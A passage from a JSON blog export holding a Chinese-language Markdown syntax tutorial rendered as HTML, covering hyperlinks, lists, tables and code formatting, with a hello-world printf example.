data-url=\"aHR0cDovL2ltZzEubHVrb3UuY29tL3N0YXRpYy9wL2Jsb2cvbWVkaXVtLzAwMjgvODAvNjYvNjMvMjg4MDY2NjMuanBn\">http://img1.lukou.com/static/p/blog/medium/0028/80/66/63/28806663.jpg</span>&quot;alt=&quot; 夜晚背景图 &quot;title=&quot; 夜空 &quot;style=&quot;zoom: 67%;&quot; /&gt;</p>\n<h2 id=\"六-超链接\"><a class=\"anchor\" href=\"#六-超链接\">#</a> 六、超链接</h2>\n<p><em><strong>[超链接名] (超链接地址 &quot;超链接 title&quot;)</strong></em></p>\n<p><em><strong>去掉 ] 后的空格，title 可加可不加！</strong></em></p>\n<p>示例：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly8yNzQwOTA4OTExLmdpdGh1Yi5pbw==\">高萌的博客</span></p>\n<h2 id=\"七-列表\"><a class=\"anchor\" href=\"#七-列表\">#</a> 七、列表</h2>\n<p><strong>语法： 无序列表用 - + * 任何一种都可以</strong></p>\n<ul>\n<li>\n<p>列表内容 （-）</p>\n<ul>\n<li>\n<p>列表内容 （+）</p>\n<ul>\n<li>列表内容 （*）</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p>（三种列表）</p>\n<p><em><strong>列表嵌套</strong></em></p>\n<p><em><strong>上一级和下一级之间敲三个空格即可</strong></em></p>\n<h2 id=\"八-表格\"><a class=\"anchor\" href=\"#八-表格\">#</a> 八、 表格</h2>\n<table>\n<thead>\n<tr>\n<th>表头</th>\n<th style=\"text-align:center\">表头</th>\n<th style=\"text-align:right\">表头</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>内容</td>\n<td style=\"text-align:center\">内容</td>\n<td style=\"text-align:right\">内容</td>\n</tr>\n<tr>\n<td>内容</td>\n<td style=\"text-align:center\">内容</td>\n<td style=\"text-align:right\">内容</td>\n</tr>\n</tbody>\n</table>\n<p><em><strong>直接从段落插入 更快一些。</strong></em></p>\n<h2 id=\"九-代码\"><a class=\"anchor\" href=\"#九-代码\">#</a> 九、代码</h2>\n<p><em><strong>单行代码：代码之间分别用一个反引号包起来</strong></em></p>\n<p>(`) 不用加括号</p>\n<p><code> printf(&quot;hello world\\n&quot;);</code></p>\n<p><em><strong>代码块：代码之间分别用三个反引号包起来，且两边的反引号单独占一行</strong></em></p>\n<p>(```)，结尾同理，不用加括号</p>\n<hr>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tE N D</p>\n",
            "tags": [
                "随笔"
            ]
        }
    ]
}